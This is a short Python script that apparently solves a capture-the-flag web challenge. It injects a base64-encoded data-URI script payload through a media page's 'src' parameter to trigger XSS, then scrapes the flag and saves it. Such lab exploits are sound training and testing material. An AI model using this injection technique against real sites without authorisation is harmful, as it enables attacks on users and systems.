import requests
import sys
import json
from bs4 import BeautifulSoup


def get_flag(host_name):
    flag = None

    data = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4='
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0',
    }
    session = requests.Session()
    session.get('http://{host}/'.format(host=host_name), data=json.dumps(headers))
    response = session.post('http://{host}/?page=media&src={data}'.format(host=host_name, data=data))

    if response.status_code == 200:
        with open('../flag', 'w') as f:
            flag = BeautifulSoup(response.text, 'html.parser').find('h2').text.split(':')[-1].strip()
            f.write(flag+'\n')

    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]

        if check_host_name(host_name):
            print(get_flag(host_name))
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
